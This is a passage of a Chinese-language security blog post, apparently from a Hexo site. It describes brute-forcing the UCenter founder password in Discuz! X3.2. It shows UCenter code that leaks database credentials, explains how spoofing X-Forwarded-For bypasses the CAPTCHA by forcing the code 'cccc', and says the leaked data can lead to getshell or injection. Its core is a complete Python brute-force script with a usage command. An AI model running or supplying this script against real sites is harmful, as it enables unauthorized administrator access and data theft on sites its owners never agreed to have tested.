$_ENV[<span class="string">'cache'</span>]-&amp;gt;updatedata(<span class="string">'apps'</span>);</span><br><span class="line"></span><br><span class="line">			<span class="keyword">$this</span>-&amp;gt;load(<span class="string">'note'</span>);</span><br><span class="line">			$notedata = <span class="keyword">$this</span>-&amp;gt;db-&amp;gt;fetch_all(&amp;quot;SELECT appid, type, name, url, ip, charset, synlogin, extra FROM &amp;quot;.UC_DBTABLEPRE.&amp;quot;applications&amp;quot;);</span><br><span class="line">			$notedata = <span class="keyword">$this</span>-&amp;gt;_format_notedata($notedata);</span><br><span class="line">			$notedata[<span class="string">'UC_API'</span>] = UC_API;</span><br><span class="line">			$_ENV[<span class="string">'note'</span>]-&amp;gt;add(<span class="string">'updateapps'</span>, <span class="string">''</span>, <span class="keyword">$this</span>-&amp;gt;serialize($notedata, <span class="number">1</span>));</span><br><span class="line">			$_ENV[<span class="string">'note'</span>]-&amp;gt;send();</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="comment">//$return = &amp;quot;UC_STATUS_OK|$app[authkey]|$app[appid]|&amp;quot;.UC_DBHOST.'|'.UC_DBNAME.'|'.UC_DBUSER.'|'.UC_DBPW.'|'.UC_DBCHARSET.'|'.UC_DBTABLEPRE.'|'.UC_CHARSET;</span></span><br><span class="line">			$return = &amp;quot;$app[authkey]|$app[appid]|&amp;quot;.UC_DBHOST.<span class="string">'|'</span>.UC_DBNAME.<span class="string">'|'</span>.UC_DBUSER.<span class="string">'|'</span>.UC_DBPW.<span class="string">'|'</span>.UC_DBCHARSET.<span class="string">'|'</span>.UC_DBTABLEPRE.<span class="string">'|'</span>.UC_CHARSET;</span><br><span class="line">		&#125;</span><br><span class="line">		@ob_end_clean();</span><br><span class="line">		<span class="keyword">exit</span>($return);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">exit</span>(<span class="string">'-1'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p> 这个函数的意思是 添加一个应用,前提是需要创始人的密码。如果密码正确,就会添加一个应用（如果重复了就直接输出）。</p>
+<p> 如何利用：</p>
+<p> <img src="http://www.0-f.org/wp-content/uploads/2014/12/Disc_.jpg" alt=""></p>
+<p> 截获个数据包然后放入burp中添加密码字典进行批量破解。<br> 成功会返回添加应用的信息，反之返回 -1。<br> 在一些网站中往往把 uc_server/admin.php做了访问限制.<br> 而index.php这里就可以直接调用破解。返回的应用信息还可以直接getshell或注入。<br> 测试版本：Discuz! X3.2 搭载的 UCenter 1.6.0</p>
+</li>
+<li><p>暴力破解创始人密码02</p>
+<p> 后台地址一般为：<code>**.**.**.**/discuz/uc_server/admin.php</code></p>
+<p> <img src="http://www.wooyun.org/upload/201410/2106555215e9de33121ac345e389897e7a033bb1.png" alt=""></p>
+<p> 含有一个验证码，验证码的地址为：</p>
+<blockquote>
+<p><a href="http://localhost/discuz/uc_server/admin.php?m=seccode&amp;seccodeauth=250dIGq%2FYDhocuXf3IrsBkvB2k23JXlXAbuWr3X1liUcX94&amp;7500" target="_blank" rel="noopener">http://localhost/discuz/uc_server/admin.php?m=seccode&amp;seccodeauth=250dIGq%2FYDhocuXf3IrsBkvB2k23JXlXAbuWr3X1liUcX94&amp;7500</a></p>
+</blockquote>
+<p> 但是，经过测试发现，登录uc_server的时候 如果ip第一次出现那么 seccode的默认值为cccc，而 ip地址 是通过X-Forwarded-For 获取的。也就是我们修改xff的ip之后，再次打开上面那个验证码url，图片的值为cccc</p>
+<p> <img src="http://www.wooyun.org/upload/201410/21071436735b1f7ae3a6d308d74b2a37b80b090e.png" alt=""></p>
+<p> 所以可以写一个程序通过修改X-Forwarded-For的值爆破密码。</p>
+ <poc>
+
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8-*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> httplib,re,random,urllib,time,requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"><span class="comment"># Boom</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getHtml</span><span class="params">(host, htmlhash, htmlpass, htmlseccode)</span>:</span></span><br><span class="line">    url = <span class="string">'http://'</span> + host + <span class="string">'/uc_server/admin.php?m=user&amp;a=login'</span></span><br><span class="line">    ip = str(random.randint(<span class="number">1</span>,<span class="number">100</span>)) + <span class="string">"."</span> + str(random.randint(<span class="number">100</span>,<span class="number">244</span>)) + <span class="string">"."</span> + str(random.randint(<span class="number">100</span>,<span class="number">244</span>)) + <span class="string">"."</span> + str(random.randint(<span class="number">100</span>,<span class="number">244</span>))</span><br><span class="line"></span><br><span class="line">    postHead = &#123;<span class="string">'host'</span>: host,</span><br><span class="line">                <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0'</span>,</span><br><span class="line">                <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'</span>,</span><br><span class="line">                <span class="string">'Accept-Language'</span>: <span class="string">'zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3'</span>,</span><br><span class="line">                <span class="string">'X-Forwarded-For'</span>: ip,</span><br><span class="line">                <span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded'</span>,</span><br><span class="line">                <span class="string">'Connection'</span>: <span class="string">'keep-alive'</span> &#125;</span><br><span class="line">    postContent = <span class="string">'sid=&amp;formhash='</span> + htmlhash + <span class="string">'&amp;seccodehidden='</span> + htmlseccode + <span class="string">'&amp;iframe=0&amp;isfounder=1&amp;password='</span> + htmlpass + <span class="string">'&amp;seccode=cccc&amp;submit=%E7%99%BB+%E5%BD%95'</span></span><br><span class="line">    <span class="comment"># resultHtml = httplib.HTTPConnection(host, 80, False)</span></span><br><span class="line">    <span class="comment"># resultHtml.request('POST', '/uc_server/admin.php?m=user&amp;a=login',</span></span><br><span class="line">    <span class="comment">#                    body = postContent,</span></span><br><span class="line">    <span class="comment">#                    headers = postHead )</span></span><br><span class="line">    <span class="comment"># page = resultHtml.getresponse()</span></span><br><span class="line">    <span class="comment"># pageConect = page.read()</span></span><br><span class="line">    page = requests.post(url, headers = postHead, data = postContent)</span><br><span class="line">    <span class="keyword">print</span> str(page.status_code) + <span class="string">'\t'</span> + str(page.history) + <span class="string">'\t'</span> + htmlpass</span><br><span class="line">    pageConect = page.text</span><br><span class="line">    pageSoup = BeautifulSoup(pageConect, <span class="string">"lxml"</span>)</span><br><span class="line">    pageTitle = pageSoup.title.string</span><br><span class="line">    <span class="keyword">return</span> pageTitle,page.status_code</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get formhash and seccodehidden</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gethashs</span><span class="params">(host)</span>:</span></span><br><span class="line">    url = <span class="string">'http://'</span> + host + <span class="string">'/uc_server/admin.php'</span></span><br><span class="line">    pageContent = requests.get(url).text</span><br><span class="line">    r1 = re.compile(<span class="string">r'&lt;input type="hidden" name="formhash" value="(\S+)" /&gt;'</span>)</span><br><span class="line">    htmlhash = r1.findall(pageContent)[<span class="number">0</span>]</span><br><span class="line">    r2 = re.compile(<span class="string">r'&lt;input type="hidden" name="seccodehidden" value="(\S+)" /&gt;'</span>)</span><br><span class="line">    htmlseccode = r2.findall(pageContent)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> htmlhash + <span class="string">' '</span> + htmlseccode</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get host/dict/sleeptime</span></span><br><span class="line"><span class="keyword">if</span>(len(argv)==<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'----&gt;python '</span> + argv[<span class="number">0</span>] + <span class="string">' host dictfile sleeptime'</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'----&gt;python '</span> + argv[<span class="number">0</span>] + <span class="string">' **.**.**.** pass.txt 0.2'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    host = argv[<span class="number">1</span>]</span><br><span class="line">    passfile = argv[<span class="number">2</span>]</span><br><span class="line">    sleeptime = argv[<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'---&gt;host:\t'</span> + host</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'---&gt;password file:\t'</span> + passfile</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'---&gt;sleeptime:\t'</span> + sleeptime</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'---&gt;\n'</span></span><br><span class="line"></span><br><span class="line">    x = gethashs(host).split(<span class="string">' '</span>)</span><br><span class="line">    f = open(passfile, <span class="string">'r'</span>)</span><br><span class="line">    htmlpass = f.readlines()</span><br><span class="line">    <span class="comment"># temp = htmlpass[:]</span></span><br><span class="line">    <span class="comment"># nf = open('temp.new', 'w')</span></span><br><span class="line"></span><br><span class="line">    f.close()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(htmlpass)):</span><br><span class="line">        pwd = str(htmlpass[i].split())</span><br><span class="line">        time.sleep(float(sleeptime))</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span>(getHtml(host, x[<span class="number">0</span>], pwd, x[<span class="number">1</span>])[<span class="number">0</span>] == <span class="string">''</span>):</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'----&gt;Password is: '</span> + pwd</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">print</span> sys.exc_info()[<span class="number">0</span>]</span><br><span class="line">    <span class="comment">#     finally:</span></span><br><span class="line">    <span class="comment">#         temp.remove(htmlpass[i])</span></span><br><span class="line">    <span class="comment">#     if i == 1:</span></span><br><span class="line">    <span class="comment">#         raise NameError('test')</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># nf.writelines(temp)</span></span><br><span class="line">                    </span><br><span class="line">    <span class="comment"># f.close()</span></span><br><span class="line">    <span class="comment"># nf.close()</span></span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">        <span class="comment"># except:</span></span><br><span class="line">        <span class="comment">#     time.sleep(5.0)</span></span><br><span class="line">        <span class="comment">#     result = getHtml(host, x[0], pwd, x[1])</span></span><br><span class="line">        <span class="comment"># if(result[0] == "UCenter Administrator's Control Panel"):</span></span><br><span class="line">        <span class="comment">#     continue</span></span><br><span class="line">        <span class="comment"># elif 5 in result[1]:</span></span><br><span class="line">        <span class="comment">#     continue</span></span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        <span class="comment">#     print '----&gt;Password is: ' + pwd</span></span><br><span class="line">        <span class="comment">#     break</span></span><br></pre></td></tr></table></figure>
+
+<p> <code>python dz.py **.**.**.** pass.txt 0</code></p>
+<p> <img src="http://www.wooyun.org/upload/201410/21065832e3c6315987a3a5ba66db3d66ae619422.png" alt=""></p>
+</li>
+<li></li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+  </div>
+
+  
+  <nav class="pagination">
+    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
+  </nav>
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">groot</p>
+  <div class="site-description" itemprop="description">运维 | 安全 | 渗透</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">24</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">25</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 2016 – 
+  <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">groot</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script>
+  function loadCount() {
+    var d = document, s = d.createElement('script');
+    s.src = 'https://securitainment.disqus.com/count.js';
+    s.id = 'dsq-count-scr';
+    (d.head || d.body).appendChild(s);
+  }
+  // defer loading until the whole page loading is completed
+  window.addEventListener('load', loadCount, false);
+</script>
+
+</body>
+</html>
